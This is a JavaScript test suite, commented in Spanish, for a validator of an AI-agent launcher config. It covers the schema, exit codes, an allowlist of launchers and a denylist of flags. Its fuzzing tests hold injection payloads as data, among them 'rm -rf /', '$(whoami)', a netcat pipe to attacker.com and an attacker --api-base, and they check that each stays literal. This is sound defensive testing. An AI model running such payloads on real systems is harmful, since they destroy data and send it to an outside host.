// =============================================================================
// Tests agent-models-validate.js — Issue #3081
//
// Cobertura completa de los 7 criterios de aceptación:
//   CA-1 · Schema cubre la forma completa (additionalProperties:false, etc).
//   CA-2 · Boot fail-fast con exit codes 0/1/2/3 + formato UX 4 líneas.
//   CA-3 · ALLOWED_LAUNCHERS hardcoded — schema enum derivado por composición.
//   CA-4 · Cross-validations (default_provider, skills.x.provider, placeholders, denylist).
//   CA-5 · Pre-commit hook usa el mismo módulo (DRY) — verificado por su API.
//   CA-6 · Fuzzing de expandSpawnArgs — payloads maliciosos quedan como argv crudo.
//   CA-7 · Documentación operativa (verificada en su archivo).
// =============================================================================
'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');

const validateMod = require('../agent-models-validate');

// ─── Helpers ─────────────────────────────────────────────────────────────────

function tmpFile(content, ext = '.json') {
  const file = path.join(os.tmpdir(), `agent-models-test-${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`);
  fs.writeFileSync(file, typeof content === 'string' ? content : JSON.stringify(content));
  return file;
}

function baseValid() {
  return {
    $schema: './agent-models.schema.json',
    default_provider: 'anthropic',
    providers: {
      anthropic: {
        launcher: 'claude',
        model: 'claude-opus-4-7',
        spawn_args_template: ['-p', '{user_prompt}', '--system-prompt-file', '{system_file}'],
        output_parser: 'anthropic-stream-json',
        quota_error_types: ['usage_limit_error', 'weekly_quota_exhausted'],
        supports_tool_use: true,
        prompt_caching: { supported: true, ttl_seconds_default: 300 },
        credentials_env: ['ANTHROPIC_API_KEY'],
        permissions_mode: 'bypassPermissions',
      },
      deterministic: {
        launcher: 'node',
        model: 'deterministic',
        spawn_args_template: ['{script_path}', '{issue}', '--trabajando={trabajando_path}'],
        output_parser: 'none',
        quota_error_types: [],
        supports_tool_use: false,
        prompt_caching: { supported: false },
      },
    },
    skills: {
      'backend-dev': { provider: 'anthropic' },
      'qa': { provider: 'anthropic', model_override: 'claude-sonnet-4-7' },
      'builder': { provider: 'deterministic' },
    },
  };
}

// ─── CA-1 · Schema completo ──────────────────────────────────────────────────

test('CA-1 · agent-models.schema.json existe en path canónico', () => {
  const stat = fs.statSync(validateMod.CANONICAL_SCHEMA_PATH);
  assert.ok(stat.isFile(), 'schema canónico debe ser archivo regular');
});

test('CA-1 · schema declara additionalProperties:false en raíz, providerDef y skillAssignment', () => {
  const schema = validateMod.getEffectiveSchema();
  assert.equal(schema.additionalProperties, false, 'raíz');
  assert.equal(schema.$defs.providerDef.additionalProperties, false, 'providerDef');
  assert.equal(schema.$defs.skillAssignment.additionalProperties, false, 'skillAssignment');
  assert.equal(schema.$defs.providerDef.properties.prompt_caching.additionalProperties, false, 'prompt_caching');
});

test('CA-1 · schema declara spawn_args_template como array<string> minItems=1', () => {
  const schema = validateMod.getEffectiveSchema();
  const tmpl = schema.$defs.providerDef.properties.spawn_args_template;
  assert.equal(tmpl.type, 'array');
  assert.deepEqual(tmpl.items, { type: 'string' });
  assert.equal(tmpl.minItems, 1);
  // No oneOf — el schema rechaza string suelto.
  assert.equal(tmpl.oneOf, undefined);
});

test('CA-1 · schema declara required en cada nivel (no opcionales por omisión)', () => {
  const schema = validateMod.getEffectiveSchema();
  assert.deepEqual(schema.required.sort(), ['default_provider', 'providers', 'skills']);
  const reqProvider = schema.$defs.providerDef.required.sort();
  assert.ok(reqProvider.includes('launcher'));
  assert.ok(reqProvider.includes('model'));
  assert.ok(reqProvider.includes('spawn_args_template'));
  assert.ok(reqProvider.includes('output_parser'));
  assert.ok(reqProvider.includes('quota_error_types'));
  assert.ok(reqProvider.includes('supports_tool_use'));
  assert.ok(reqProvider.includes('prompt_caching'));
});

test('CA-1 · ejemplo válido pasa la validación', () => {
  const file = tmpFile(baseValid());
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, true, JSON.stringify(r.errors));
    assert.equal(r.exitCode, 0);
    assert.deepEqual(r.errors, []);
  } finally { fs.unlinkSync(file); }
});

// ─── CA-2 · Boot fail-fast + exit codes ──────────────────────────────────────

test('CA-2 · validate retorna exitCode 2 + mensaje accionable cuando archivo no existe', () => {
  const r = validateMod.validate('/path/that/does/not/exist/agent-models.json');
  assert.equal(r.ok, false);
  assert.equal(r.exitCode, 2);
  assert.equal(r.errors.length, 1);
  assert.match(r.errors[0].message, /falta crear agent-models.json.*#3072/);
});

test('CA-2 · validate retorna exitCode 2 cuando JSON es inválido (parse error)', () => {
  const file = tmpFile('{invalid json:', '.json');
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    assert.equal(r.exitCode, 2);
    assert.match(r.errors[0].message, /JSON inválido/);
  } finally { fs.unlinkSync(file); }
});

test('CA-2 · formato de error sigue patrón UX 4 líneas con archivo, problema, solución, reproducir', () => {
  const file = tmpFile('not-json', '.json');
  try {
    const r = validateMod.validate(file);
    const msg = validateMod.formatError(r.errors[0], { filePath: file, contextLabel: 'boot abortado' });
    const lines = msg.split('\n');
    assert.match(lines[0], /^\[validate\] FATAL agent-models\.json inválido — boot abortado$/);
    assert.match(lines[1], /^  archivo:/);
    assert.match(lines[2], /^  problema:/);
    assert.match(lines[3], /^  solución:/);
    assert.match(lines[4], /^  reproducir: node \.pipeline\/lib\/agent-models-validate\.js$/);
  } finally { fs.unlinkSync(file); }
});

test('CA-2 · formato sin emojis (rompe alineación monoespaciada)', () => {
  const file = tmpFile('not-json', '.json');
  try {
    const r = validateMod.validate(file);
    const msg = validateMod.formatAllErrors(r.errors, { filePath: file });
    // No emojis: rangos básicos de pictogramas Unicode (U+1F300–U+1FAFF típicos).
    assert.doesNotMatch(msg, /[\u{1F300}-\u{1FAFF}]/u, 'emojis prohibidos en error UX');
    // No checkmark/cross unicode genéricos tampoco.
    assert.doesNotMatch(msg, /[✅❌🚨⚠️]/);
  } finally { fs.unlinkSync(file); }
});

test('CA-2 · validateOrExit invoca exitFn con el código correcto + escribe a stderr', () => {
  const file = '/path/that/does/not/exist.json';
  let exitCode = null;
  let stderrMsg = '';
  validateMod.validateOrExit({
    jsonPath: file,
    onErrorWrite: (m) => { stderrMsg += m + '\n'; },
    exitFn: (c) => { exitCode = c; },
  });
  assert.equal(exitCode, 2);
  assert.match(stderrMsg, /\[validate\] FATAL/);
  assert.match(stderrMsg, /falta crear agent-models\.json/);
});

// ─── CA-3 · ALLOWED_LAUNCHERS source-of-truth + composición programática ────

test('CA-3 · ALLOWED_LAUNCHERS expone exactamente los 5 launchers permitidos', () => {
  assert.deepEqual([...validateMod.ALLOWED_LAUNCHERS].sort(), ['claude', 'codex', 'gemini', 'node', 'ollama']);
});

test('CA-3 · ALLOWED_LAUNCHERS es congelado (Object.freeze) — inmutabilidad', () => {
  assert.ok(Object.isFrozen(validateMod.ALLOWED_LAUNCHERS));
});

test('CA-3 · schema enum de launcher se compone desde ALLOWED_LAUNCHERS al cargar', () => {
  const schema = validateMod.getEffectiveSchema();
  const enumInSchema = schema.$defs.providerDef.properties.launcher.enum;
  assert.deepEqual([...enumInSchema].sort(), [...validateMod.ALLOWED_LAUNCHERS].sort());
});

test('CA-3 · launcher fuera de ALLOWED_LAUNCHERS hace fallar la validación con mensaje claro', () => {
  const cfg = baseValid();
  cfg.providers.anthropic.launcher = 'curl';
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    assert.equal(r.exitCode, 2);
    const msg = r.errors.map((e) => e.message).join(' ');
    assert.match(msg, /allowed values|allowedValues/);
  } finally { fs.unlinkSync(file); }
});

// ─── CA-4 · Cross-validations ────────────────────────────────────────────────

test('CA-4.1 · default_provider que no es key de providers → rechazado', () => {
  const cfg = baseValid();
  cfg.default_provider = 'fake';
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    const e = r.errors.find((er) => er.path === '#/default_provider');
    assert.ok(e, 'debe haber error en default_provider');
    assert.match(e.message, /no es key de providers/);
  } finally { fs.unlinkSync(file); }
});

test('CA-4.2 · skills.<x>.provider que no es key de providers → rechazado', () => {
  const cfg = baseValid();
  cfg.skills['rogue-skill'] = { provider: 'fake-provider' };
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    const e = r.errors.find((er) => er.path === '#/skills/rogue-skill/provider');
    assert.ok(e, 'debe haber error en skills.rogue-skill.provider');
    assert.match(e.message, /no es key de providers/);
  } finally { fs.unlinkSync(file); }
});

test('CA-4.3 · placeholder fuera de ALLOWED_PLACEHOLDERS → rechazado', () => {
  const cfg = baseValid();
  cfg.providers.anthropic.spawn_args_template = ['-p', '{evil_placeholder}'];
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    const e = r.errors.find((er) => er.message.includes('evil_placeholder'));
    assert.ok(e, `debe haber error de placeholder; errors: ${JSON.stringify(r.errors)}`);
    assert.match(e.message, /no está en allowlist/);
  } finally { fs.unlinkSync(file); }
});

test('CA-4.3b · placeholder con sintaxis manipulada {user_prompt:--api-base=x} → rechazado', () => {
  const cfg = baseValid();
  cfg.providers.anthropic.spawn_args_template = ['-p', '{user_prompt:--api-base=http://x}'];
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    const e = r.errors.find((er) => er.message.includes('user_prompt:--api-base'));
    assert.ok(e, 'debe rechazar placeholder con : embebido');
  } finally { fs.unlinkSync(file); }
});

test('CA-4.4 · flag de denylist en spawn_args_template → rechazado', () => {
  for (const flag of ['--api-base', '--proxy', '--http-proxy', '--config', '--inspect', '--require', '-r', '-e']) {
    const cfg = baseValid();
    cfg.providers.anthropic.spawn_args_template = ['-p', '{user_prompt}', flag, 'value'];
    const file = tmpFile(cfg);
    try {
      const r = validateMod.validate(file);
      assert.equal(r.ok, false, `flag ${flag} debe ser rechazado`);
      const e = r.errors.find((er) => er.message.includes(flag));
      assert.ok(e, `debe haber error mencionando ${flag}`);
    } finally { fs.unlinkSync(file); }
  }
});

test('CA-4.4b · flag de denylist concatenado con =valor → rechazado', () => {
  const cfg = baseValid();
  cfg.providers.anthropic.spawn_args_template = ['-p', '{user_prompt}', '--api-base=http://attacker.com'];
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    const e = r.errors.find((er) => er.message.includes('--api-base'));
    assert.ok(e, 'flag concatenado con = debe ser detectado');
  } finally { fs.unlinkSync(file); }
});

// ─── additionalProperties:false enforcement (refinamiento Security #1) ──────

test('CA-1.add · campo extra "onSpawn" en provider → rechazado por additionalProperties:false', () => {
  const cfg = baseValid();
  cfg.providers.anthropic.onSpawn = 'evil';
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    const e = r.errors.find((er) => /must NOT have additional properties|additionalProperty/.test(er.message));
    assert.ok(e, 'debe rechazar additionalProperty');
    assert.match(JSON.stringify(r.errors), /onSpawn/);
  } finally { fs.unlinkSync(file); }
});

test('CA-1.add · campo extra "preExec" en raíz → rechazado', () => {
  const cfg = baseValid();
  cfg.preExec = 'evil';
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    assert.match(JSON.stringify(r.errors), /preExec|additional/);
  } finally { fs.unlinkSync(file); }
});

test('CA-1.add · spawn_args_template como string suelto → rechazado por type:array', () => {
  const cfg = baseValid();
  cfg.providers.anthropic.spawn_args_template = '-p {user_prompt}';
  const file = tmpFile(cfg);
  try {
    const r = validateMod.validate(file);
    assert.equal(r.ok, false);
    assert.match(JSON.stringify(r.errors), /spawn_args_template|array/);
  } finally { fs.unlinkSync(file); }
});

// ─── CA-6 · Fuzzing del template runner (expandSpawnArgs) ────────────────────

test('CA-6 · expandSpawnArgs preserva user_prompt como argv crudo (shell separator semicolon)', () => {
  const malicious = '; rm -rf / #';
  const result = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: malicious });
  assert.deepEqual(result, ['-p', malicious]);
  assert.equal(result[1], malicious, 'el payload aparece como UN solo elemento del argv');
});

test('CA-6 · expandSpawnArgs preserva command substitution $(whoami)', () => {
  const malicious = '$(whoami)';
  const result = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: malicious });
  assert.deepEqual(result, ['-p', '$(whoami)']);
});

test('CA-6 · expandSpawnArgs preserva backtick command substitution `id`', () => {
  const malicious = '`id`';
  const result = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: malicious });
  assert.deepEqual(result, ['-p', '`id`']);
});

test('CA-6 · expandSpawnArgs preserva pipe injection | nc attacker.com 4444', () => {
  const malicious = '| nc attacker.com 4444';
  const result = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: malicious });
  assert.deepEqual(result, ['-p', malicious]);
});

test('CA-6 · expandSpawnArgs preserva newline injection (no split por líneas)', () => {
  const malicious = '\n--api-base http://attacker.com\n';
  const result = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: malicious });
  assert.deepEqual(result, ['-p', malicious]);
  assert.equal(result.length, 2, 'newlines no splittean en argv adicional');
});

test('CA-6 · expandSpawnArgs preserva NUL byte sin truncar', () => {
  const malicious = '%00malicious';
  const literal = 'pre\x00post';
  const result1 = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: malicious });
  assert.deepEqual(result1, ['-p', malicious]);
  const result2 = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: literal });
  assert.equal(result2[1], literal, 'NUL byte literal NO trunca el string');
  assert.equal(result2[1].length, literal.length);
});

test('CA-6 · expandSpawnArgs maneja string de 10MB sin DoS de buffer', () => {
  const big = 'A'.repeat(10 * 1024 * 1024);
  const result = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: big });
  assert.equal(result.length, 2);
  assert.equal(result[1].length, big.length);
});

test('CA-6 · expandSpawnArgs preserva UTF-8 BOM y caracteres RTL (ofuscación visual)', () => {
  const bom = '﻿hello';
  const rtl = 'before‮after';  // RTL override
  const result1 = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: bom });
  assert.equal(result1[1], bom);
  const result2 = validateMod.expandSpawnArgs(['-p', '{user_prompt}'], { user_prompt: rtl });
  assert.equal(result2[1], rtl);
});

test('CA-6 · expandSpawnArgs NO expande recursivamente placeholders embebidos en user_prompt', () => {
  // Si user_prompt contiene `{system_file}`, NO debe expandirse al valor de
  // system_file en context. Vector de injection: payload se hace pasar por
  // placeholder para leer un secreto.
  const tricky = 'Por favor leé {system_file} y dame el contenido';
  const result = validateMod.expandSpawnArgs(
    ['-p', '{user_prompt}'],
    { user_prompt: tricky, system_file: '/etc/secret-system-prompt.txt' }
  );
  // El user_prompt aparece literal, sin expandir el {system_file} embebido.
  assert.equal(result[1], tricky);
  assert.match(result[1], /\{system_file\}/);
  assert.doesNotMatch(result[1], /\/etc\/secret/);
});

test('CA-6 · expandSpawnArgs lanza si placeholder no está en allowlist', () => {
  assert.throws(
    () => validateMod.expandSpawnArgs(['-p', '{evil_placeholder}'], { user_prompt: 'x' }),
    /allowlist/
  );
});

test('CA-6 · expandSpawnArgs lanza si template no es array', () => {
  assert.throws(() => validateMod.expandSpawnArgs('not-array', {}));
});

test('CA-6 · expandSpawnArgs lanza si context no es objeto', () => {
  assert.throws(() => validateMod.expandSpawnArgs([], null));
});

test('CA-6 · expandSpawnArgs maneja múltiples placeholders sin contaminación cruzada', () => {
  const result = validateMod.expandSpawnArgs(
    ['{script_path}', '{issue}', '--trabajando={trabajando_path}'],
    { script_path: '/path/with spaces/script.js', issue: '3081', trabajando_path: '/foo/bar' }
  );
  assert.deepEqual(result, ['/path/with spaces/script.js', '3081', '--trabajando=/foo/bar']);
});

test('CA-6 · expandSpawnArgs convierte placeholder ausente a string vacío', () => {
  const result = validateMod.expandSpawnArgs(['-x', '{user_prompt}'], {});
  assert.deepEqual(result, ['-x', '']);
});

// ─── Module-level integration ────────────────────────────────────────────────

test('Integración · validateOrExit con archivo válido devuelve ok:true sin exit', () => {
  const file = tmpFile(baseValid());
  let exitCalled = false;
  try {
    const r = validateMod.validateOrExit({
      jsonPath: file,
      onErrorWrite: () => {},
      exitFn: () => { exitCalled = true; },
    });
    assert.equal(r.ok, true);
    assert.equal(exitCalled, false);
  } finally { fs.unlinkSync(file); }
});

test('Integración · CANONICAL_SCHEMA_PATH y CANONICAL_JSON_PATH apuntan a .pipeline/', () => {
  assert.match(validateMod.CANONICAL_SCHEMA_PATH, /\.pipeline[\\/]agent-models\.schema\.json$/);
  assert.match(validateMod.CANONICAL_JSON_PATH, /\.pipeline[\\/]agent-models\.json$/);
});

// ─── parseJsonOrJsonc ────────────────────────────────────────────────────────

test('parseJsonOrJsonc · acepta .jsonc con comentarios //', () => {
  const file = tmpFile('// comment\n{ "a": 1 } // tail comment\n', '.jsonc');
  try {
    const r = validateMod.parseJsonOrJsonc(fs.readFileSync(file, 'utf8'), file);
    assert.deepEqual(r, { a: 1 });
  } finally { fs.unlinkSync(file); }
});

test('parseJsonOrJsonc · acepta .jsonc con bloques /* */', () => {
  const file = tmpFile('/* leading */ { "a": /* inline */ 1 }', '.jsonc');
  try {
    const r = validateMod.parseJsonOrJsonc(fs.readFileSync(file, 'utf8'), file);
    assert.deepEqual(r, { a: 1 });
  } finally { fs.unlinkSync(file); }
});

test('parseJsonOrJsonc · NO trata // dentro de strings como comentario', () => {
  const file = tmpFile('{ "url": "http://example.com" }', '.jsonc');
  try {
    const r = validateMod.parseJsonOrJsonc(fs.readFileSync(file, 'utf8'), file);
    assert.equal(r.url, 'http://example.com');
  } finally { fs.unlinkSync(file); }
});

// ─── EXIT_CODES contract ─────────────────────────────────────────────────────

test('EXIT_CODES · contrato 0/1/2/3 documentado en CA-2', () => {
  assert.equal(validateMod.EXIT_CODES.OK, 0);
  assert.equal(validateMod.EXIT_CODES.UNCAUGHT, 1);
  assert.equal(validateMod.EXIT_CODES.INVALID_CONFIG, 2);
  assert.equal(validateMod.EXIT_CODES.TOOLCHAIN_MISSING, 3);
});

// ─── Schema literal vs constante: drift detection ───────────────────────────

test('CA-3 · si schema literal disagrees con ALLOWED_LAUNCHERS, runtime gana (composición)', () => {
  // El schema en disco tiene un literal informativo. La constante exportada
  // es la fuente de verdad. Aunque alguien manipule el JSON del schema, el
  // validador compone el enum desde la constante al cargar.
  const schemaPath = validateMod.CANONICAL_SCHEMA_PATH;
  const schemaTxt = fs.readFileSync(schemaPath, 'utf8');
  const schemaParsed = JSON.parse(schemaTxt);
  const literalEnum = schemaParsed.$defs.providerDef.properties.launcher.enum;

  // Si el literal coincide accidentalmente, este test sigue válido.
  // El punto es que getEffectiveSchema lo OVERRIDE.
  const effective = validateMod.getEffectiveSchema();
  const effectiveEnum = effective.$defs.providerDef.properties.launcher.enum;
  assert.deepEqual([...effectiveEnum].sort(), [...validateMod.ALLOWED_LAUNCHERS].sort());

  // Verificación adicional: el effective enum NO referencia al objeto literal
  // del schema en disco (es array independiente).
  effectiveEnum.push('mutation-test');
  // Si fueran la misma referencia, esto contaminaría literalEnum.
  // En cualquier caso, ALLOWED_LAUNCHERS sigue intacto (Object.freeze).
  assert.equal(validateMod.ALLOWED_LAUNCHERS.length, 5);
});
